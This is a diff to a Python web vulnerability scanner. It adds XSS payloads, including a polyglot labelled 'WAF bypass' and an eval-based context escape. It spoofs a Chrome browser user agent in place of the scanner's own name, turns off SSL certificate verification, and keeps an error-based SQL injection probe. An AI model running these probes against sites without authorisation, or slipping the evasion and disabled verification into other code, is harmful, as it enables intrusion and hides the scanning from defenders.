@@ -1,14 +1,20 @@
 import requests
 import time
+import urllib3
+
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 
 # --------------------------------
 # Session + Headers (speed boost)
 # --------------------------------
 session = requests.Session()
+session.verify = False  # Disable SSL verification for real-world sites
 
 HEADERS = {
-    "User-Agent": "DSG-Scanner/1.0"
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5"
 }
 
 
@@ -23,6 +29,8 @@ XSS_PAYLOADS = [
     "javascript:alert(1)",
     "<iframe src=javascript:alert(1)>",
     "'><script>alert(1)</script>",
+    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//",  # Polyglot WAF bypass
+    "'\"><img src=x onerror=window.onerror=eval;throw'alert(1)'>",  # Advanced context escape
     "<body onload=alert(1)>",
     "<input onfocus=alert(1) autofocus>",
     "<details open ontoggle=alert(1)>"
@@ -559,7 +567,7 @@ def test_error_sql(url, params, method='get', data=None):
                 test_url = url
             else:
                 test_url = f"{url}&{p}='"
-                r = requests.get(test_url, timeout=5)
+                r = requests.get(test_url, timeout=5, verify=False)
 
             for e in errors:
                 if e.lower() in r.text.lower():
